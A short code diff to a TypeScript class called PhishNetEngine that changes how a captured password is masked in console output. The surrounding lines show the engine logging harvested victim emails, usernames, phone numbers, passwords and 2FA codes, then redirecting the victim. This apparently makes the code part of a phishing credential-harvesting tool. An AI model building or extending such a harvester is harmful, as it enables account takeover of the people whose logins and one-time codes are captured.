@@ -252,7 +252,7 @@ export class PhishNetEngine {
                 if (normalized.email) console.log(chalk.white(`    Email: ${normalized.email}`));
                 if (normalized.username) console.log(chalk.white(`    Username: ${normalized.username}`));
                 if (normalized.phone) console.log(chalk.white(`    Phone: ${normalized.phone}`));
-                if (normalized.password) console.log(chalk.white(`    Password: ${'â€¢'.repeat(Math.min(normalized.password.length, 10))}`));
+                if (normalized.password) console.log(chalk.white(`    Password: ${'*'.repeat(Math.min(normalized.password.length, 10))}`));
                 if (normalized.otp) console.log(chalk.white(`    2FA: ${normalized.otp}`));
                 
                 const redirectUrl = req.body.redirect || 'https://google.com';
